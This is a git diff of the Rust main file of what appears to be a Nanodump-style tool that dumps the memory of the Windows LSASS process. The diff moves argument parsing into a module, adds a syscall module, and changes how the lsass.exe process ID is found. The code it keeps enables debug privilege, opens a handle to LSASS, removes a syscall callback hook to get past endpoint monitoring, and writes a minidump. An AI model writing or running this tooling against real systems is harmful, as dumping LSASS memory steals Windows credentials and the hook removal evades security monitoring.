@@ -4,53 +4,23 @@ mod utils;
 mod core;
 mod nt;
 mod winapi;
+mod cli;
+mod syscall;
 
-use std::process::exit;
-use clap::{ArgAction, Parser};
-use log::{debug, error, info, trace, warn};
-use nt::dump::model::{DumpContext, MINIDUMP_IMPL_VERSION, MINIDUMP_SIGNATURE, MINIDUMP_VERSION};
-use crate::winapi::finder::get_pid_by_name;
-use crate::core::process::get_name_by_pid_nt;
-use crate::core::dump::{duplicate_lsass_handle, open_handle_to_lsass};
-use crate::core::permission::{get_lsass_clone_permissions, get_lsass_min_permissions};
+use crate::cli::parser::parse_args;
+use crate::core::dump::open_handle_to_lsass;
+use crate::core::permission::get_lsass_min_permissions;
 use crate::core::privilege::{enable_debug_privilege, is_debug_privilege_enabled};
-use crate::nt::minidump::dump_process;
+use crate::core::process::get_pid_by_name_nt;
 use crate::nt::dump::nanodump::nano_dump_write_dump;
 use crate::utils::process_instrumentation_callback::remove_syscall_callback_hook;
 use crate::utils::utils::{get_full_path, write_buffer};
-
-/// Nanodump - Process memory dumping tool
-#[derive(Parser, Debug)]
-#[command(author, version, about, long_about = None)]
-struct Args {
-    /// Get core ID
-    #[arg(long, default_value_t = 0)]
-    lsass_pid: u32,
-
-    /// Only print lsass pid value
-    #[arg(long)]
-    get_pid_and_leave: bool,
-
-    /// Increase verbosity (-v, -vv, -vvv)
-    #[arg(short, long, action = ArgAction::Count)]
-    verbose: u8,
-
-    /// Quiet mode (no output)
-    #[arg(short, long)]
-    quiet: bool,
-
-    /// Write dump to disk
-    #[arg(short, long)]
-    write_dump_to_disk: bool,
-
-    /// Dump path
-    #[arg(short, long, default_value= "dump.bin")]
-    path: String,
-}
-
+use log::{debug, error, info};
+use nt::dump::model::{DumpContext, MINIDUMP_IMPL_VERSION, MINIDUMP_SIGNATURE, MINIDUMP_VERSION};
+use std::process::exit;
 
 fn main() {
-    let args = Args::parse();
+    let args = parse_args();
 
     let log_level = if args.quiet {
         log::LevelFilter::Off
@@ -64,6 +34,9 @@ fn main() {
     };
 
     env_logger::Builder::from_default_env().filter_level(log_level).init();
+
+    //it_works();
+    //exit(0);
 
     debug!("========== PARAMETERS ==========");
 
@@ -122,21 +95,21 @@ fn main() {
     debug!("========== LSASS PID ==========");
     info!("Trying to obtain lsass pid...");
 
-    let lsass_pid: Option<u32>;
+    let lsass_pid: Option<usize>;
 
     if args.lsass_pid == 0{
         info!("  -> Searching pid by name lsass.exe");
-        lsass_pid = get_pid_by_name("lsass.exe");
+        lsass_pid = get_pid_by_name_nt("lsass.exe");
         if lsass_pid.is_none() {
-            error!("Process non trouvé");
+            error!("Error: Unable to find process");
             exit(1);
         }
     }
     else {
         info!("  -> pid provided by user");
-        lsass_pid = Some(args.lsass_pid);
+        lsass_pid = Some(args.lsass_pid as usize);
     }
-    let lsass_pid = lsass_pid.unwrap();
+    let lsass_pid = lsass_pid.unwrap() as u32;
     info!("    -> LSASS process ID: {}", lsass_pid);
     if args.get_pid_and_leave{
         debug!("Ending process due to get_pid_and_leave...");
@@ -162,7 +135,7 @@ fn main() {
 
     debug!("========== DUMPING MEMORY ==========");
     info!("Trying to dump memory...");
-    //let _ = dump_process(hprocess.unwrap(), lsass_pid,"lsass_dump.dmp");
+    //let _ = dump_process(h_process.unwrap(), lsass_pid,"lsass_dump.dmp");
 
     let mut dc : DumpContext = DumpContext {
         h_process,
